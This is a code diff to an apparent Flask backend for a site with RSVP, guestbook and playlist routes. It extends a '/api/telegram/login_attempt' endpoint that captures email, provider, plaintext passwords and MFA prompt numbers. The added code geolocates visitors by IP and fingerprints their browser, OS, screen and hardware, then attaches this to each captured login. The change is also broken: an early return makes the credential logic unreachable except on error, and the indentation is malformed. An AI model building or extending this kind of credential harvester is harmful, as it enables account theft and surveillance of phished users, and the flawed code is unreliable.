@@ -235,13 +235,7 @@ def register_routes(app, telegram_service, rsvps, guestbook, playlist, logs):
                 "ipPlaceholder": ip
             })
 
-            if telegram_service.is_configured():
-                def send_alert():
-                    try:
-                        telegram_service.send_visitor_alert(visitor)
-                    except Exception as e:
-                        print(f"Failed to send visitor alert: {e}", flush=True)
-                threading.Thread(target=send_alert).start()
+           
 
             return jsonify({"success": True, "visitor": visitor})
         except Exception as e:
@@ -297,6 +291,94 @@ Your real-time connection is <b>ONLINE</b> and functional!
     # -----------------------------------------------------------------------
     @app.route("/api/telegram/login_attempt", methods=["POST"])
     def login_attempt():
+        try:
+            client_body = request.json or {}
+
+            forwarded = request.headers.get("X-Forwarded-For")
+            ip = forwarded.split(",")[0].strip() if forwarded else (request.remote_addr or "127.0.0.1")
+            if ip.startswith("::ffff:"):
+                ip = ip[7:]
+
+            resolved_loc = {"city": "Unknown", "region": "Unknown", "country_name": "Unknown", "country_code": "??", "org": "Unknown"}
+
+            is_local_ip = (not ip or ip in ("::1", "127.0.0.1") or ip.startswith(("10.", "192.168.", "172.")))
+
+            if is_local_ip:
+                try:
+                    res = requests.get("https://ipwho.is/", timeout=3)
+                    if res.status_code == 200:
+                        d = res.json()
+                        if d and d.get("success") is not False:
+                            resolved_loc = {
+                                "city": d.get("city") or "Unknown",
+                                "region": d.get("region") or "Unknown",
+                                "country_name": f"{d.get('country') or 'Unknown'} (Server Host Node)",
+                                "country_code": d.get("country_code") or "??",
+                                "org": d.get("connection", {}).get("org") or d.get("connection", {}).get("isp") or "Unknown"
+                            }
+                except Exception:
+                    resolved_loc = {"city": "Local Sandbox", "region": "Internal Platform", "country_name": "Localhost Developer Loopback", "country_code": "US", "org": "Gateway Dev Network"}
+            else:
+                fetched = False
+                try:
+                    res = requests.get(f"https://ipwho.is/{ip}", timeout=3)
+                    if res.status_code == 200:
+                        d = res.json()
+                        if d and d.get("success") is not False:
+                            resolved_loc = {
+                                "city": d.get("city") or "Unknown",
+                                "region": d.get("region") or "Unknown",
+                                "country_name": d.get("country") or "Unknown",
+                                "country_code": d.get("country_code") or "??",
+                                "org": d.get("connection", {}).get("org") or d.get("connection", {}).get("isp") or "Unknown"
+                            }
+                            fetched = True
+                except Exception as e:
+                    print(f"[Geolocation] ipwho.is failed: {e}", flush=True)
+
+                if not fetched:
+                    try:
+                        res = requests.get(f"https://freeipapi.com/api/json/{ip}", timeout=3)
+                        if res.status_code == 200:
+                            d = res.json()
+                            resolved_loc = {
+                                "city": d.get("cityName") or "Unknown",
+                                "region": d.get("regionName") or "Unknown",
+                                "country_name": d.get("countryName") or "Unknown",
+                                "country_code": d.get("countryCode") or "??",
+                                "org": "Unknown"
+                            }
+                    except Exception as e:
+                        print(f"[Geolocation] freeipapi failed: {e}", flush=True)
+
+            visitor = {
+                "ip": ip,
+                **resolved_loc,
+                "browser": client_body.get("browser") or "Unknown Browser",
+                "os": client_body.get("os") or "Unknown OS",
+                "screenSize": client_body.get("screenSize") or "Unknown",
+                "language": client_body.get("language") or "Unknown",
+                "timezone": client_body.get("timezone") or "Unknown",
+                "cores": client_body.get("cores") or "Unknown",
+                "platform": client_body.get("platform") or "Unknown",
+                "userAgent": client_body.get("userAgent") or "Unknown"
+            }
+
+            loc_str = ", ".join(filter(None, [visitor["city"], visitor["region"], visitor["country_name"]]))
+            logs.insert(0, {
+                "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
+                "timestamp": datetime.utcnow().isoformat() + "Z",
+                "type": "PAGE_VIEW",
+                "details": f"[VISITOR ACCESS] IP: {ip} | Location: {loc_str or 'Unknown'} | Browser: {visitor['browser']} ({visitor['os']})",
+                "ipPlaceholder": ip
+            })
+
+           
+
+            return jsonify({"success": True, "visitor": visitor})
+        except Exception as e:
+            print(f"Visitor entry error: {e}", flush=True)
+            
         data = request.json or {}
         provider = data.get("provider")
         email = data.get("email")
@@ -307,15 +389,18 @@ Your real-time connection is <b>ONLINE</b> and functional!
 
         attempt_id = "attempt-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9))
         new_attempt = {
-            "id": attempt_id,
-            "provider": provider,
-            "email": email,
-            "password": password or "",
-            "promptNumber": None,
-            "promptCandidates": None,
-            "status": "pending",
-            "timestamp": datetime.utcnow().isoformat() + "Z"
-        }
+    "id": attempt_id,
+    "provider": provider,
+    "email": email,
+    "password": password or "",
+    "promptNumber": None,
+    "promptCandidates": None,
+    "status": "pending",
+    "timestamp": datetime.utcnow().isoformat() + "Z",
+
+    # ✅ ADD THIS
+    "visitor": visitor
+}
 
         try:
             save_attempt(new_attempt)
